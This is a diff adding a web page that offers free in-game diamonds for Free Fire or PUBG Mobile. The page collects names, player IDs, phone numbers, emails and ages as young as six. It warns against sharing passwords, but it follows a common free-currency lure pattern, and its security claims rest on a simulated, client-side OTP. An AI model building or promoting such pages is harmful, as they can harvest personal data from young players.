@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Claim — Diamond UC (Secure)</title>
+  <link rel="icon" href="logo-favicon.png" type="image/png">
+
+  <!-- Bootstrap & icons & fonts -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --gold1:#FFD36E; --gold2:#FFB84D;
+      --muted:#b9c7d6; --card:#081827;
+      font-family:'Poppins',system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+    }
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,#04050a,#071226);color:#eaf4ff}
+    .container-center{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px}
+    .card-wrap{width:100%;max-width:980px;border-radius:14px;padding:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);box-shadow:0 30px 80px rgba(2,6,23,0.6)}
+    .grid{display:grid;grid-template-columns:1fr 380px;gap:18px}
+    @media (max-width:980px){ .grid{grid-template-columns:1fr} .right-aside{order:2} .left-main{order:1} }
+    .brand {display:flex;gap:12px;align-items:center}
+    .diamond-mark{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,var(--gold1),var(--gold2));display:grid;place-items:center;font-weight:800;color:#031623}
+    h1{font-size:20px;margin:0}
+    .muted{color:var(--muted);font-size:13px}
+    /* Progress */
+    .progress-track{height:10px;background:rgba(255,255,255,0.03);border-radius:999px;overflow:hidden}
+    .progress-track > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--gold1),var(--gold2));border-radius:999px;transition:width 420ms ease}
+
+    /* form */
+    .form-card{padding:12px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent);border:1px solid rgba(255,255,255,0.02)}
+    .input-icon{position:relative}
+    .input-icon i{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--muted)}
+    .input-icon input, .input-icon select, .input-icon textarea{padding-left:40px}
+    .btn-primary-custom{background:linear-gradient(90deg,var(--gold1),var(--gold2));color:#031623;border-radius:10px;border:0;padding:.6rem 1rem;font-weight:800}
+    .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--gold1);border-radius:10px;padding:.45rem .9rem}
+    .notice{background:rgba(255,255,255,0.02);padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.02);font-size:13px}
+
+    /* right */
+    .right-aside .pkg-ico{width:64px;height:64px;border-radius:12px;background:linear-gradient(135deg,var(--gold1),var(--gold2));display:grid;place-items:center;font-weight:800;color:#031623}
+    .right-aside .box{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.02)}
+    /* small screens - tweak */
+    @media (max-width:420px){
+      .diamond-mark{width:48px;height:48px}
+      .grid{gap:10px}
+      .input-icon input, .input-icon select, .input-icon textarea{padding-left:38px}
+    }
+
+    /* subtle hover for cards */
+    .fancy{transition:transform .25s ease,box-shadow .25s ease}
+    .fancy:hover{transform:translateY(-6px);box-shadow:0 20px 60px rgba(0,0,0,0.6)}
+  </style>
+</head>
+<body>
+  <!-- background blended characters at 50% opacity - replace with your licensed images -->
+  <div style="position:fixed;inset:0;z-index:0;pointer-events:none;opacity:0.5;background-image:url('bg-freefire.jpg'),url('bg-pubg.jpg');background-position:center right,center left;background-size:cover,cover;mix-blend-mode:screen;filter:blur(2px) saturate(1.05)"></div>
+
+  <div class="container-center" style="position:relative;z-index:10">
+    <div class="card-wrap">
+      <div class="grid">
+        <!-- LEFT: steps & form -->
+        <div class="left-main">
+          <div class="d-flex align-items-center justify-content-between mb-2">
+            <div class="brand">
+              <div class="diamond-mark" aria-hidden="true">♦</div>
+              <div>
+                <h1>Claim Starter Pack — 3 Diamonds</h1>
+                <div class="muted">Secure delivery — we never collect passwords</div>
+              </div>
+            </div>
+            <div class="muted">Order flow • 100% mobile-friendly</div>
+          </div>
+
+          <div class="progress-track mb-3" aria-hidden="true"><i id="progressBar"></i></div>
+          <div class="d-flex gap-2 mb-3">
+            <div class="form-card flex-fill">
+              <!-- CHOICE: game select -->
+              <label class="form-label muted">Choose Game</label>
+              <div class="d-flex gap-2 mb-2">
+             <button id="chooseFF" class="btn btn-ghost w-50" onclick="window.location.href='freefire.html'">Free Fire</button>
+
+                <button id="choosePUBG" class="btn btn-ghost w-50">PUBG Mobile</button>
+              </div>
+
+              <div id="formSteps">
+                <!-- STEP: 1 - Game chosen & Player name -->
+                <div id="step-player" class="mb-3">
+                  <label class="form-label muted">In-game display name</label>
+                  <div class="input-icon mb-2">
+                    <i class="fa-solid fa-user"></i>
+                    <input id="playerName" class="form-control bg-transparent text-light" type="text" placeholder="Your display name" aria-label="Player name">
+                  </div>
+
+                  <label class="form-label muted">Linked account</label>
+                  <div class="input-icon mb-3">
+                    <i class="fa-brands fa-facebook"></i>
+                    <select id="linkedVia" class="form-select bg-transparent text-light" aria-label="Linked via">
+                      <option value="guest">Guest</option>
+                      <option value="facebook">Facebook</option>
+                      <option value="google">Google</option>
+                      <option value="twitter">Twitter</option>
+                    </select>
+                  </div>
+
+                  <div class="d-flex gap-2">
+                    <button id="toId" class="btn btn-primary-custom ms-auto">Next — Player ID</button>
+                  </div>
+                </div>
+
+                <!-- STEP: 2 - ID input (dynamically validates 9/10 digits) -->
+                <div id="step-id" style="display:none">
+                  <label class="form-label muted">Player ID</label>
+                  <div class="input-icon mb-2">
+                    <i class="fa-solid fa-hashtag"></i>
+                    <input id="playerId" class="form-control bg-transparent text-light" type="text" inputmode="numeric" placeholder="Enter numeric ID" aria-label="Player ID">
+                  </div>
+
+                  <div class="muted mb-2">Example: Free Fire = 9 digits, PUBG = 10 digits. We'll check format immediately.</div>
+
+                  <label class="form-label muted">Phone (for delivery / OTP)</label>
+                  <div class="input-icon mb-3">
+                    <i class="fa-solid fa-phone"></i>
+                    <input id="phone" class="form-control bg-transparent text-light" type="tel" placeholder="+92..." aria-label="phone">
+                  </div>
+
+                  <div class="d-flex gap-2">
+                    <button id="backToPlayer" class="btn btn-ghost">Back</button>
+                    <button id="toVerify" class="btn btn-primary-custom ms-auto">Next — Verify</button>
+                  </div>
+                </div>
+
+                <!-- STEP: 3 - Verify (email & OTP simulation) -->
+                <div id="step-verify" style="display:none">
+                  <label class="form-label muted">Email (for OTP & receipt)</label>
+                  <div class="input-icon mb-2">
+                    <i class="fa-solid fa-envelope"></i>
+                    <input id="email" class="form-control bg-transparent text-light" type="email" placeholder="you@example.com" aria-label="Email">
+                  </div>
+
+                  <div class="d-flex gap-2 align-items-center mb-2">
+                    <input id="otpInput" type="text" class="form-control bg-transparent text-light" placeholder="Enter OTP" style="max-width:220px" maxlength="6" aria-label="OTP" />
+                    <button id="btnSendOtp" class="btn btn-ghost">Send OTP</button>
+                    <div id="otpTimer" class="muted ms-auto" style="font-size:13px"></div>
+                  </div>
+
+                  <div class="muted mb-2">We will send a one-time code to your email/phone. Implement server-side OTP for production.</div>
+
+                  <div class="d-flex gap-2">
+                    <button id="backToId" class="btn btn-ghost">Back</button>
+                    <button id="toReview" class="btn btn-primary-custom ms-auto">Next — Review</button>
+                  </div>
+                </div>
+
+                <!-- STEP: 4 - Review & consent (no password) -->
+                <div id="step-review" style="display:none">
+                  <div class="notice mb-3"><strong>Important:</strong> <span class="muted">Do not enter or share any account passwords. If someone asks you for a password, it's fraud. We will never ask for your password. This form only collects public IDs, contact info, and a verification OTP so we can confirm ownership.</span></div>
+
+                  <label class="form-label muted">Age (optional)</label>
+                  <div class="input-icon mb-2">
+                    <i class="fa-solid fa-cake-candles"></i>
+                    <input id="age" class="form-control bg-transparent text-light" type="number" placeholder="Your age (optional)" min="6" max="120">
+                  </div>
+
+                  <label class="form-label muted">Support notes / Link (optional)</label>
+                  <div class="input-icon mb-2">
+                    <i class="fa-solid fa-link"></i>
+                    <input id="supportLink" class="form-control bg-transparent text-light" type="url" placeholder="Paste profile link or screenshot link" aria-label="support link">
+                  </div>
+
+                  <div class="form-check mb-2">
+                    <input id="consent" class="form-check-input" type="checkbox">
+                    <label for="consent" class="form-check-label muted">I confirm I own this in-game account & I accept the <a href="#" style="color:var(--gold1)">Terms & Conditions</a>.</label>
+                  </div>
+
+                  <div class="d-flex gap-2">
+                    <button id="backToVerify" class="btn btn-ghost">Back</button>
+                    <button id="submitBtn" class="btn btn-primary-custom ms-auto">Submit & Claim</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- RIGHT: summary / package / support -->
+        <aside class="right-aside">
+          <div class="box mb-3 fancy">
+            <div class="d-flex align-items-center gap-3">
+              <div class="pkg-ico">3</div>
+              <div>
+                <div style="font-weight:800">Starter Pack</div>
+                <div class="muted">3 Diamonds • Free • Limited</div>
+              </div>
+            </div>
+            <div class="muted mt-2">ETA: Instant after verification. One free claim per account/IP.</div>
+          </div>
+
+          <div class="box mb-3">
+            <div style="font-weight:800">Support</div>
+            <div class="muted mt-2">If you need help, contact: <a href="mailto:support@diamonduc.com" style="color:var(--gold1)">support@diamonduc.com</a></div>
+            <div class="muted mt-2">Do not share passwords. If you accidentally entered a password, change it immediately in the game settings and contact support.</div>
+          </div>
+
+          <div class="box">
+            <div style="font-weight:800">Security & Privacy</div>
+            <div class="muted mt-2">We store public IDs and contact info encrypted. For automated delivery, publisher API or manual fulfillment is required.</div>
+          </div>
+        </aside>
+      </div>
+    </div>
+  </div>
+
+  <!-- JS libraries -->
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    // --- UI state ---
+    let selectedGame = null; // 'freefire' or 'pubg'
+    let currentStep = 'player'; // player -> id -> verify -> review
+    const progressBar = $('#progressBar');
+
+    // Update progress visually
+    function updateProgress(){
+      const map = {player:0, id:33, verify:66, review:100};
+      progressBar.css('width', map[currentStep] + '%');
+    }
+
+    function showStep(step){
+      currentStep = step;
+      $('#formSteps > div').hide();
+      if(step === 'player') $('#step-player').show();
+      if(step === 'id') $('#step-id').show();
+      if(step === 'verify') $('#step-verify').show();
+      if(step === 'review') $('#step-review').show();
+      updateProgress();
+      window.scrollTo({top:0,behavior:'smooth'});
+    }
+
+    // choose game handlers
+    $('#chooseFF').on('click', function(){
+      selectedGame = 'freefire';
+      $('#chooseFF').removeClass('btn-ghost').addClass('btn-primary-custom');
+      $('#choosePUBG').removeClass('btn-primary-custom').addClass('btn-ghost');
+      showStep('player');
+    });
+    $('#choosePUBG').on('click', function(){
+      selectedGame = 'pubg';
+      $('#choosePUBG').removeClass('btn-ghost').addClass('btn-primary-custom');
+      $('#chooseFF').removeClass('btn-primary-custom').addClass('btn-ghost');
+      showStep('player');
+    });
+
+    // navigation buttons
+    $('#toId').on('click', ()=> {
+      if(!selectedGame){ alert('Choose Free Fire or PUBG first'); return; }
+      const name = $('#playerName').val().trim();
+      if(!name || name.length < 2){ alert('Enter a valid display name'); return; }
+      showStep('id');
+    });
+    $('#backToPlayer').on('click', ()=> showStep('player'));
+
+    $('#toVerify').on('click', ()=> {
+      const id = $('#playerId').val().trim();
+      if(selectedGame === 'freefire'){
+        if(!/^\d{9}$/.test(id)){ alert('Free Fire ID must be 9 digits'); return; }
+      } else if(selectedGame === 'pubg'){
+        if(!/^\d{10}$/.test(id)){ alert('PUBG ID must be 10 digits'); return; }
+      } else { alert('Choose a game'); return; }
+
+      // optionally, call server-side verification here:
+      // $.post('/api/verify-id',{game:selectedGame,id:id})...
+      showStep('verify');
+    });
+    $('#backToId').on('click', ()=> showStep('id'));
+
+    // OTP simulation (frontend only) - in production replace with server-side send
+    let otpState = {sent:false,value:null,expires:null,timer:null};
+    function startOtpTimer(seconds){
+      clearInterval(otpState.timer);
+      const end = Date.now() + seconds*1000;
+      $('#otpTimer').text('Expires in ' + seconds + 's');
+      otpState.timer = setInterval(()=>{
+        const left = Math.max(0, Math.round((end - Date.now())/1000));
+        $('#otpTimer').text('Expires in ' + left + 's');
+        if(left <= 0){ clearInterval(otpState.timer); $('#otpTimer').text('OTP expired'); otpState.sent=false; }
+      }, 500);
+    }
+
+    $('#btnSendOtp').on('click', function(){
+      const email = $('#email').val().trim();
+      const phone = $('#phone').val().trim();
+      if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) && phone.length < 8){
+        alert('Enter a valid email or phone to receive OTP');
+        return;
+      }
+
+      // FRONTEND SIMULATION ONLY:
+      otpState.value = String(Math.floor(100000 + Math.random()*900000));
+      otpState.sent = true;
+      startOtpTimer(600);
+      alert('OTP simulated (for testing): ' + otpState.value + '\\nImplement server-side OTP for real use.');
+      // PRODUCTION: do $.post('/api/send-otp',{email,phone,orderRef:...})...
+    });
+
+    $('#toReview').on('click', ()=>{
+      // validate email and OTP if sent
+      const email = $('#email').val().trim();
+      if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ alert('Enter a valid email'); return; }
+      if(otpState.sent){
+        const entered = $('#otpInput').val().trim();
+        if(!entered){ alert('Enter OTP sent to your email'); return; }
+        if(entered !== otpState.value){ alert('Invalid OTP'); return; }
+      } else {
+        if(!confirm('OTP not sent. Are you sure you want to continue without OTP?')) return;
+      }
+      showStep('review');
+    });
+    $('#backToVerify').on('click', ()=> showStep('verify'));
+
+    // submission - blocks password-like values
+    $('#submitBtn').on('click', function(){
+      const name = $('#playerName').val().trim();
+      const id = $('#playerId').val().trim();
+      const email = $('#email').val().trim();
+      const phone = $('#phone').val().trim();
+      const consent = $('#consent').is(':checked');
+      if(!consent){ alert('You must accept the Terms & Conditions'); return; }
+      if(!name || name.length < 2){ alert('Invalid name'); return; }
+      if(selectedGame === 'freefire' && !/^\d{9}$/.test(id)){ alert('Free Fire ID must be 9 digits'); return; }
+      if(selectedGame === 'pubg' && !/^\d{10}$/.test(id)){ alert('PUBG ID must be 10 digits'); return; }
+      if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ alert('Valid email required'); return; }
+
+      // SECURITY: check that no field looks like a password (simple heuristic)
+      const suspects = [name, id, email, phone, $('#supportLink').val() || ''];
+      const looksLikePassword = suspects.some(s => /password|pwd|pass|login|secret|token/i.test(s));
+      if(looksLikePassword){ alert('Do NOT enter passwords or secret tokens. Remove any such text before submitting.'); return; }
+
+      // build payload
+      const payload = {
+        game: selectedGame,
+        player_name: name,
+        player_id: id,
+        linked_via: $('#linkedVia').val(),
+        phone: phone,
+        email: email,
+        age: $('#age').val() || null,
+        support_link: $('#supportLink').val() || null,
+        package_id: 'starter_3',
+        consent: true,
+        timestamp: new Date().toISOString()
+      };
+
+      // disable button, show progress animation
+      const btn = $(this);
+      btn.prop('disabled', true).text('Submitting...');
+
+      // send to server - REPLACE with your secure endpoint
+      $.ajax({
+        url: '/api/create-order',
+        method: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify(payload),
+        timeout: 20000,
+        success: function(res){
+          // expected { status: 'pending'|'success', order_id: 'ORD-...' }
+          alert('Server response:\\n' + JSON.stringify(res));
+          if(res && res.order_id){
+            window.location.href = '/order-status?order_id=' + encodeURIComponent(res.order_id);
+          } else {
+            // for demo, show success screen
+            alert('Claim submitted. If this was a test, implement /api/create-order server-side to process fulfillment.');
+            btn.prop('disabled', false).text('Submit & Claim');
+          }
+        },
+        error: function(xhr, status, err){
+          console.error('submit error', status, err);
+          alert('Submission failed: ' + (xhr.responseText || status));
+          btn.prop('disabled', false).text('Submit & Claim');
+        }
+      });
+    });
+
+    // initialize recommended defaults
+    $(function(){ updateProgress(); showStep('player'); });
+    function updateProgress(){ const map = {player:0,id:33,verify:66,review:100}; $('#progressBar').css('width', (map[currentStep] || 0) + '%'); }
+
+    // Accessibility: prevent Enter from accidental form submit
+    $('input').on('keypress', function(e){ if(e.which === 13) e.preventDefault(); });
+  </script>
+</body>
+</html>
